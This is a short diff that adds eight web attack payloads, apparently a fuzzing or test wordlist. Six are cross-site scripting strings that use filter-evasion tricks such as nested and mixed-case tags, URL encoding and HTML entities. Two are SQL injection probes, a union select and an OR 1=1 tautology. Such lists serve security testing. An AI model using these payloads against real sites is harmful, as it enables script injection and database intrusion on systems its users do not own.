@@ -1,0 +1,8 @@
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<ScRiPt>alert(1)</sCrIpT>
+%3Cscript%3Ealert(1)%3C/script%3E
+<svg><script>alert&#40;1&#41;</script>
+<img src=x onerror=alert&lpar;1&rpar;>
+\"><svg/onload=alert(1)>
+' union select 1,2,3 -- -
+0x27 OR 1=1--
